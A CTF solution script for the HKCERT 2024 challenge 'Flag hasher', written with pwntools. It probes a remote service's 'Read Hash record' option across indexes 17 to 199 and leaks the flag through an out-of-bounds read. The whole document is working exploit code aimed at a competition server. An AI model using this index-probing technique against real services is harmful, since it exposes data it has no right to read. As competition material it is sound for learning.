# Flag hasher [100 points] (136 solves)
```python
from pwn import *

context.log_level = 'CRITICAL'
def connect():
    return remote("c55-flag-hasher.hkcert24.pwnable.hk", 1337, ssl=True)

def try_read_at_index(idx):
    try:
        r = connect()
        r.sendlineafter(b'2 - Read Hash record\n', b'2')
        r.sendlineafter(b'Idx: ', str(idx).encode())
        result = r.recvline()
        if b'Entry does not exist' not in result and b'Segmentation fault' not in result:
            strings_base64 = result[13:88].strip().decode()
            bytes_result = bytes.fromhex(strings_base64).decode()
            if 'hkcert' in bytes_result:
                print(f"Found at index {idx}!")
                print(f"Value: {bytes_result}")
                r.close()
                return
    except:
        r.close()

for idx in range(17, 200):  # flag is in 188
    try_read_at_index(idx)
```